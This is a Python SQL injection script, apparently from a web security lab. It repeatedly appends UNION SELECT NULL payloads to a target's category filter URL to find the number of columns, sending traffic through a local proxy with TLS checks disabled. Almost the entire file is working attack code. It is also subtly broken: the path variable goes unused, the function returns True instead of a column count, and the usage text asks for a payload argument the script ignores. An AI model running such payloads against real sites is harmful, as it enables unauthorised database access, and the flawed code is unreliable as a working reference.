import requests
import urllib3
import sys
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def exploit_sqli(url):
    path = '/filter?category=Tech+gifts'
    payload = "' union select null"
    # pay2 = payload + " null"
    # flag = True
    count = 0
    for i in range (20):
        # while flag:
        #     payload = payload + " null"
        #     r = requests.get(url + payload +"--", verify=False, proxies=proxies)
        #     flag = False  
        payload = payload + ", null"
        r = requests.get(url + payload + "--", verify=False, proxies=proxies)
        count+=1
        if "Internal Server Error" not in r.text:
            return True

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-]Usages: %s <url> <payload>" % sys.argv[0])
        print("[-]Example: %s www.example.com '1=1'" % sys.argv[0])
        sys.exit(-1)
    

    print("[+] Finding the number of column......")
    num_cols = exploit_sqli(url)
    if num_cols:
        print("[+] Exploited" )
    else:
        print("[+] Exploit Unsuccessful")